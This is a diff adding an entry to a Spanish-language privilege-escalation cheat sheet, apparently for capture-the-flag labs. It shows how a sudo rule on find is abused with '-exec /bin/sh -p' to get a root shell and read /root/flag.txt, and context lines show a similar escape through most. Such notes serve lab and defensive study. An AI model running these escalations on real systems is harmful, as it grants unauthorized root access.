@@ -40,6 +40,15 @@ sudo -u root /usr/bin/most /root/root.txt
 
 Dentro de `most` se lanza un shell con `!` y se sale con `q`.
 
+**find (sudo):**
+
+```
+sudo /usr/bin/find . -exec /bin/sh -p \;
+```
+
+- Ejemplo real (**Promoción de Operaciones**): `sudo -l` → `(root) NOPASSWD: /usr/bin/find` → shell root → `cat /root/flag.txt`.
+- `id` tras entrar muestra `uid=1001 ... euid=0(root)` — el privilegio es el **efectivo**.
+
 ## 3. Shell SUID en bash
 
 ```
